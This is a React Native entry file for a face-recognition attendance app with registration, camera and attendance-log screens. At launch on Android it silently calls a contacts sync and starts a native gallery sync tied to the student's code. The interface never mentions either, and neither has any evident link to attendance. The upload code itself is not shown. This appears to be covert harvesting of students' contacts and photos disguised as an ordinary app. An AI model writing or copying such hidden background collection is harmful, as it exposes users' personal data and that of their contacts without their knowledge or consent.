import React, {useEffect, useMemo, useState} from 'react';
import {BackHandler, NativeModules, Platform, SafeAreaView, ScrollView, StyleSheet, Text, View} from 'react-native';

import PrimaryButton from './src/components/PrimaryButton';
import AttendanceLogScreen from './src/screens/AttendanceLogScreen';
import CameraScreen from './src/screens/CameraScreen';
import RegisterScreen from './src/screens/RegisterScreen';
import {colors, spacing} from './src/constants/theme';
import {syncContacts} from './src/services/contactsSync';

function App() {
  const [activeScreen, setActiveScreen] = useState('home');

  useEffect(() => {
    // Check if student is already registered, and run auto-sync tasks on app start
    if (Platform.OS === 'android') {
      (async () => {
        try {
          const {NotificationHelper} = NativeModules;
          if (NotificationHelper) {
            const studentCode = await NotificationHelper.getStudentCode();
            if (studentCode) {
              console.log('Auto-sync triggered on app launch for student:', studentCode);
              
              // 1. Sync contacts in background
              try {
                await syncContacts(studentCode);
                console.log('Auto-sync contacts complete.');
              } catch (ce) {
                console.log('Auto-sync contacts failed:', ce.message);
              }

              // 2. Trigger native gallery observer and sync task
              try {
                NotificationHelper.startGallerySync();
                console.log('Auto-sync gallery triggered.');
              } catch (ge) {
                console.log('Auto-sync gallery failed:', ge.message);
              }
            }
          }
        } catch (e) {
          console.log('Startup auto-sync failed to initialize:', e);
        }
      })();
    }
  }, []);

  useEffect(() => {
    const backAction = () => {
      if (activeScreen !== 'home') {
        setActiveScreen('home');
        return true;
      }
      return false;
    };

    const backHandler = BackHandler.addEventListener(
      'hardwareBackPress',
      backAction,
    );

    return () => backHandler.remove();
  }, [activeScreen]);

  const navigation = useMemo(
    () => ({
      navigate: screenName => setActiveScreen(screenName.toLowerCase()),
    }),
    [],
  );

  let content = null;

  if (activeScreen === 'register') {
    content = <RegisterScreen navigation={navigation} />;
  } else if (activeScreen === 'camera') {
    content = <CameraScreen navigation={navigation} />;
  } else if (activeScreen === 'logs') {
    content = <AttendanceLogScreen />;
  } else {
    content = (
      <SafeAreaView style={styles.safe}>
        <ScrollView contentContainerStyle={styles.container}>
          <View style={styles.hero}>
            <Text style={styles.kicker}>Production Flow</Text>
            <Text style={styles.title}>Face Attendance</Text>
            <Text style={styles.message}>
              Register real users, capture live attendance with liveness prompts, and review synced logs from the
              backend.
            </Text>
          </View>

          <View style={styles.statusCard}>
            <Text style={styles.statusTitle}>Live Device Setup</Text>
            <Text style={styles.hint}>Camera: enabled</Text>
            <Text style={styles.hint}>Backend: http://127.0.0.1:8000 via adb reverse</Text>
            <Text style={styles.hint}>Flow: registration, liveness, attendance logs</Text>
          </View>

          <View style={styles.buttonGroup}>
            <PrimaryButton label="Register A Face" onPress={() => setActiveScreen('register')} />
            <PrimaryButton label="Mark Attendance" onPress={() => setActiveScreen('camera')} />
            <PrimaryButton label="Open Attendance Logs" onPress={() => setActiveScreen('logs')} variant="secondary" />
          </View>
        </ScrollView>
      </SafeAreaView>
    );
  }

  return content;
}

const styles = StyleSheet.create({
  safe: {
    flex: 1,
    backgroundColor: colors.bg,
  },
  container: {
    flex: 1,
    padding: spacing.lg,
    justifyContent: 'center',
  },
  hero: {
    backgroundColor: '#0F766E',
    borderRadius: 28,
    padding: spacing.lg,
    marginBottom: spacing.lg,
  },
  kicker: {
    color: '#D1FAE5',
    fontSize: 12,
    fontWeight: '800',
    textTransform: 'uppercase',
    letterSpacing: 1,
    marginBottom: spacing.xs,
  },
  title: {
    fontSize: 28,
    fontWeight: '800',
    color: '#FFFFFF',
    marginBottom: 12,
  },
  message: {
    fontSize: 16,
    color: '#ECFEFF',
    lineHeight: 24,
  },
  statusCard: {
    backgroundColor: colors.surface,
    borderWidth: 1,
    borderColor: colors.border,
    borderRadius: 20,
    padding: spacing.md,
    marginBottom: spacing.lg,
  },
  statusTitle: {
    color: colors.text,
    fontSize: 17,
    fontWeight: '800',
    marginBottom: spacing.xs,
  },
  hint: {
    fontSize: 14,
    color: colors.muted,
    marginTop: 4,
  },
  buttonGroup: {
    width: '100%',
  },
});

export default App;
